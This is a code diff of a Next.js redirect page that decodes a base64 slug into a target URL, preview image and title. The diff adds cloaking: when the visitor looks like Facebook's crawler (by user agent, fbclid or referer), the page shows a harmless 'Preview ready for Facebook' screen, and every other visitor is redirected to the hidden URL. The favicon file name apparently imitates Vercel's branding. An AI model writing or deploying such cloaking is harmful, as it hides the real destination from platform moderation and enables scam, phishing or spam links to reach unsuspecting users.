@@ -1,4 +1,3 @@
-// pages/[slug].tsx
 import { GetServerSideProps } from "next";
 import Head from "next/head";
 import { useEffect } from "react";
@@ -7,54 +6,56 @@ interface Props {
   redirectUrl: string;
   imageUrl: string;
   title: string;
+  shouldRedirect: boolean;
 }
-
-const offerUrl = "https://example.com/offer"; // ganti sesuai kebutuhan
 
 export const getServerSideProps: GetServerSideProps = async (context) => {
   const slugParts = context.params?.slug || [];
   const encoded = Array.isArray(slugParts) ? slugParts.join("/") : slugParts;
 
-  const fbclid = context.query.fbclid;
-  const referringURL = context.req.headers.referer || "";
-
   if (!encoded) return { notFound: true };
 
   try {
-    const decoded = Buffer.from(encoded, "base64").toString("utf-8");
-    const { redirectUrl, imageUrl, title } = JSON.parse(decoded);
+    const json = Buffer.from(encoded, "base64").toString("utf-8");
+    const { redirectUrl, imageUrl, title } = JSON.parse(json);
 
-    if (!redirectUrl || !imageUrl) throw new Error("Invalid data");
+    const fbclid = context.query.fbclid || "";
+    const referer = context.req.headers.referer || "";
+    const ua = context.req.headers["user-agent"] || "";
 
-    if (referringURL.includes("facebook.com") || fbclid) {
-      return {
-        redirect: {
-          destination: offerUrl,
-          permanent: false,
-        },
-      };
-    }
+    const isFacebookBot =
+      ua.includes("facebookexternal") ||
+      ua.includes("Facebot") ||
+      fbclid ||
+      referer.includes("facebook.com");
 
     return {
       props: {
         redirectUrl,
         imageUrl,
         title: title || "Redirecting...",
+        shouldRedirect: !isFacebookBot, // jangan redirect kalau bot
       },
     };
-  } catch (err) {
+  } catch (e) {
     return { notFound: true };
   }
 };
 
-
-export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
+export default function RedirectPage({
+  redirectUrl,
+  imageUrl,
+  title,
+  shouldRedirect,
+}: Props) {
   useEffect(() => {
-    const timer = setTimeout(() => {
-      window.location.href = redirectUrl;
-    }, 2500);
-    return () => clearTimeout(timer);
-  }, [redirectUrl]);
+    if (shouldRedirect) {
+      const timer = setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 2000);
+      return () => clearTimeout(timer);
+    }
+  }, [redirectUrl, shouldRedirect]);
 
   return (
     <>
@@ -67,19 +68,19 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
         {imageUrl && <meta property="og:image" content={imageUrl} />}
         <link rel="image_src" href={imageUrl} />
         <link rel="icon" href="/varcel.png" type="image/x-icon" />
-        <style>
-          {`
-            @keyframes spin {
-              0% { transform: rotate(0deg); }
-              100% { transform: rotate(360deg); }
-            }
-          `}
-        </style>
+        <style>{`
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+        `}</style>
       </Head>
 
       <main style={styles.container}>
         <div style={styles.loader}></div>
-        <div style={styles.loadingText}>Please wait...</div>
+        <div style={styles.loadingText}>
+          {shouldRedirect ? "Please wait..." : "Preview ready for Facebook"}
+        </div>
         {imageUrl && (
           <img
             src={imageUrl}
@@ -122,4 +123,3 @@ const styles: { [key: string]: React.CSSProperties } = {
     opacity: 0.8,
   },
 };
-
